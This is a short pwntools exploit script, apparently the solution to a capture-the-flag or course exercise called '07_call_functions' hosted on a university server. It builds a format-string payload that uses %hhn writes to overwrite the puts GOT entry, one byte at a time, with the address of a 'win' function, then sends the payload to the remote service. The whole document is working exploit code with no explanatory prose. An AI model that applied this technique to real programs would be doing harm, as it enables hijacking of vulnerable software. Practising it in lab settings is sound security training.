from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 25197

PROG_NAME = "07_call_functions"

elf = ELF(PROG_NAME)
win_address = elf.symbols["win"]  # 0x 08 04 92 16
puts_address = elf.got["puts"]  # 0x 08 04 C0 18

print("Win address ", win_address)
print("puts address: ", puts_address)

s = remote(SERVER, PORT)

payload = p32(puts_address)  # 4
payload += p32(puts_address + 1)  # 8
payload += p32(puts_address + 2)  # 12
payload += p32(puts_address + 3)  # 16

# 16 92 04 08 (little endian)
payload += b"%06c%7$hhn"  # 0x16
# 16 + 6 = 22
payload += b"%124c%8$hhn"  # 0x92
# 22 + 124 = 146
payload += b"%114c%9$hhn"  # 0x04
# 146 + 110(0) + 4 = 4
payload += b"%04c%10$hhn"  # 0x8
# 4 + 4 = 8

s.sendline(payload)
print(s.recv())
